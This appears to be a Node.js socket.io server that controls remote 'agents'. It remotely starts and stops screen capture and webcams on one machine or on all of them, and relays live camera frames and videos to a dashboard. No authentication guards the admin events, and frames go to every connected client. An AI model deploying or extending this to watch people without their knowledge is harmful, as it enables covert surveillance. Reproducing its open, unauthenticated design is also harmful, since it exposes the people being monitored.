const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const PORT = Number(process.env.PORT) || 3000;
const CLIENT_ORIGIN = process.env.CLIENT_ORIGIN || '*';

const allowedOrigins = CLIENT_ORIGIN === '*'
    ? '*'
    : CLIENT_ORIGIN.split(',').map((origin) => origin.trim()).filter(Boolean);

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ['GET', 'POST']
    }
});

let agents = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
    res.status(200).json({ ok: true });
});

io.on('connection', (socket) => {
    console.log(`[socket] connected: ${socket.id}`);
    socket.emit('update_agent_list', Object.values(agents));

    const emitAgentList = () => {
        io.emit('update_agent_list', Object.values(agents));
    };

    const emitControl = (eventName, payload = {}) => {
        const targetId = payload?.targetId;

        if (targetId) {
            io.to(targetId).emit(eventName, { targetId });
            return;
        }

        io.emit(eventName, {});
    };

    socket.on('register_node', (data) => {
        agents[socket.id] = {
            machine: data.machine,
            id: socket.id,
            recording: false,
            cameraOn: false
        };
        console.log(`[agent] registered: ${data.machine} (${socket.id})`);
        emitAgentList();
    });

    socket.on('agent_state_update', (data = {}) => {
        const previous = agents[socket.id] || { id: socket.id, machine: data.machine || 'Unknown-PC' };

        agents[socket.id] = {
            ...previous,
            machine: data.machine || previous.machine,
            recording: Boolean(data.recording),
            cameraOn: Boolean(data.cameraOn),
            lastStateAt: Date.now()
        };

        emitAgentList();
        io.emit('ui_agent_state', {
            agentId: socket.id,
            machine: agents[socket.id].machine,
            recording: agents[socket.id].recording,
            cameraOn: agents[socket.id].cameraOn,
            source: data.source || 'agent'
        });
    });

    // Recording Controls
    socket.on('admin_start_capture', (payload) => emitControl('start_capture', payload));
    socket.on('admin_stop_capture', (payload) => emitControl('stop_capture', payload));

    socket.on('admin_start_all', () => emitControl('start_capture'));
    socket.on('admin_stop_all', () => emitControl('stop_capture'));

    // Camera Controls
    socket.on('admin_start_camera', (payload) => emitControl('start_camera', payload));
    socket.on('admin_stop_camera', (payload) => emitControl('stop_camera', payload));

    // Relay Camera Frames from Agent to Dashboard
    socket.on('camera_frame', (data) => {
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.emit('ui_camera_display', {
            ...data,
            agentId: socket.id,
            machine: agent.machine
        });
    });

    socket.on('video_upload_complete', (data) => {
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.emit('new_video_link', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('disconnect', () => {
        console.log(`[socket] disconnected: ${socket.id}`);
        delete agents[socket.id];
        emitAgentList();
        io.emit('ui_agent_state', {
            agentId: socket.id,
            online: false,
            recording: false,
            cameraOn: false,
            source: 'disconnect'
        });
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on 0.0.0.0:${PORT}`);
    console.log(`Allowed CLIENT_ORIGIN: ${CLIENT_ORIGIN}`);
});
